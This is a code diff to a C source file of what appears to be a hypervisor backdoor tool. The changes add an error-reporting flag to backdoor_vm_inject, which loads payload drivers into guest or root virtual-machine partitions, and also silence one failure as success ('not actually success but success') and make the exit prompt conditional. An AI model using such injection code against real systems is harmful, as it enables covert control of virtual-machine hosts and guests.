@@ -86,7 +86,7 @@ int check_loader_image(uint8_t *loader, int loader_size)
     return 0;
 }
 //--------------------------------------------------------------------------------------
-int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size)
+int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
 {
     int ret = -1;
     uint64_t phys_addr = 0, cr3 = 0;
@@ -857,13 +857,21 @@ _nt_found:
     
     if (!alloc_only)
     {
-        if (image_addr != 0)
+        if (report_error)
         {
-            printf("[+] Payload driver image address is 0x%llx\n", image_addr);
+            if (image_addr != 0)
+            {
+                printf("[+] Payload driver image address is 0x%llx\n", image_addr);
+            }
+            else
+            {
+                printf("ERROR: Driver loader was unable to load payload driver\n");
+            }
         }
         else
         {
-            printf("ERROR: Driver loader was unable to load payload driver\n");
+            // not actually success but success
+            ret = 0;
         }
     }
     
@@ -1037,7 +1045,7 @@ int backdoor_vm_exec(uint64_t pml4_addr, char *command)
         printf("[+] Loading VM exec drvier...\n");
 
         // load VM exec driver into the specified partition
-        if (backdoor_vm_inject(pml4_addr, NULL, vm_exec_kernel_sys, sizeof(vm_exec_kernel_sys)) != 0)
+        if (backdoor_vm_inject(pml4_addr, NULL, vm_exec_kernel_sys, sizeof(vm_exec_kernel_sys), false) != 0)
         {
             printf("ERROR: Can't load VM exec drvier\n");
             return -1;
@@ -2491,8 +2499,11 @@ int _tmain(int argc, _TCHAR* argv[])
             printf("       VM call count: 0x%llx\n\n", info.vm_call_count);
         }
 
-        printf("Press any key to quit...\n");
-        _getch();
+        if (argc < 2)
+        {
+            printf("Press any key to quit...\n");
+            _getch();
+        }
     }
     else
     {
@@ -2969,7 +2980,7 @@ int _tmain(int argc, _TCHAR* argv[])
                 if (fread(driver, 1, st.st_size, fd) == st.st_size)
                 {
                     // inject driver into the guest or root partition
-                    backdoor_vm_inject(pml4_addr, NULL, driver, st.st_size);
+                    backdoor_vm_inject(pml4_addr, NULL, driver, st.st_size, true);
                 }
                 else
                 {
